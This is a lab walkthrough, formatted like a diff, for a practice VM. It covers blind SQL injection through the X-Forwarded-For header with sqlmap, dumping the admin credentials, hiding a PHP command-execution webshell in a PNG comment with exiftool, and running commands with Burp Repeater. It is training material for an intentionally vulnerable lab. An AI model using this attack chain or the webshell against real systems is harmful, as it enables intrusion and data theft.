@@ -1,0 +1,63 @@
+
+Hack the Pentester Lab: from SQL injection to Shell II (Blind SQL Injection)
+
+Today we are going to perform penetration testing with part II of previous lab, download it from here. Now install the iso image in VM ware and start it. In this lab task level is intermediate and challenge is to gain access of administration console and then upload a PHP webshell.
+Start Kali Linux then open the terminal and type netdiscover command for scanning network. Here 192.168.1.102 is my target IP which is shown in the screenshot. Now explore this IP in browser.
+
+When you will open target IP in browser you will get a web page having heading My Awesome Photoblog. On the top of left side it contains some tags: home; test; ruxcon; 2010; all pictures; admin. Now Click on test.
+
+The given URL: http://192.168.1.102/cat.php?id=1 will run sql query for ID 1 now let try to find out whether the above URL is vulnerable to sql injection or not by adding(‘) apostrophe at last of URL:
+http://192.168.1.102/cat.php?id=1’ as it is not vulnerable. I didn’t get any error message like I have got in its part 1then I try to find out whether the other IDs is vulnerable or not but here also I found nothing. 
+
+Now use nikto to scan the target for any vulnerability and type following command.
+Nikto –h 192.168.1.102
+ Look over the highlighted part in screenshot; from the result, it tells that X-Content-Type-Option header is not set.
+
+Then I had used acunetix to scan the target which has declared the level of threat is high for blind sql injection.
+Hence it is clear that exploit the target through sql injection.
+
+Now type the following command for blind sql injection using sqlmap
+sqlmap -u “http://192.168.1.102/cat.php?id=1″ –headers=”X-Forwarded-For: *” –dbs –batch
+ Now try sql injection for header; the target application might be designed with X-Forwarded-For header which is used to run application behind a reverse-proxy.
+
+Our assumption is correct above header is vulnerable to sql injection and I have got database name photoblog.
+
+Now let’s fetch entire data under photoblog database through following command:
+sqlmap -u “http://192.168.1.102/cat.php?id=1″ –headers=”X-Forwarded-For: *” –D photoblog –dump-all –batch
+
+Here Task was to gain access of administration console for which we required the login: password of his account. Through sqlmap command we have got login as admin and password as P4ssw0rd.
+
+Now try to use above credential to access administration console, again open target IP: 192.168.1.102 in browser and click on admin tab present on the top of left side and type login as admin and password as P4ssw0rd.
+
+Congrats!!! The first task is completed.
+Now last task is to upload a PHP webshell. Under administration console you will notice a link Add a new picture for uploading an image in this web server. Click on Add a new picture to upload image.
+
+Here we can upload image through Add option now I will try to upload PHP webshell
+
+I try to upload php malicious file using .php extension; double extension .php.jpg; also used case sensitive extension like PHP, pHP but every time failed to upload backdoor and following web page gets open.
+
+Then I had used exiftool for hiding the malicious code inside the png image. For this step you need to download an image and save it on desktop now prepare a php file by typing following malicious code in a text file to create command injection vulnerability and save it with .php extension as I have saved with raj.php on the desktop.
+<?php $cmd=$GET[‘cmd’]; system($cmd); ?>
+ Now type command for exiftool to hide malicious code of php file inside the png image
+Cd Desktop
+Exiftool “-comment<=raj.php” 1.png
+Exiftool 1.png
+ From screenshot you can perceive I have three files on desktop one for php as raj.php another for downloaded image as 1.png original and third php webshell as 1.png
+
+Now I had browse 1.png to add it as new image which is our php webshell.
+
+Our malicious file successfully uploaded on web server. You can see a new row is added as webshell php which contains our backdoor raj.php, now click on webshell php.
+
+Here is our malicious image; now right click on it and click view image tag.
+
+Here this image will get opened in separate window and if you remembered its contains malicious code of command injection.
+
+Here I try to execute ls command by adding /cmd.php?cmd=ls/etc at the end of the URL and from screenshot you can analysis this page is encoded.
+
+Now last option is to use repeater under burp suite to execute the commands. Start burp suite and set manual proxy of browser then open the web page where “you are hacked image” is uploaded.
+Now capture the cookies through burp suit and sent the intercepted data to repeater option by making right click on its window.
+
+Now change the header from /show.php?id=4 into /admin/uploads/1484502823.png/cmd.php?cmd=ls now click on GO tab to send this request for getting response and when you will scroll down  (response) here I found some information through ls command.
+Great!!!  We have completed both tasks.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
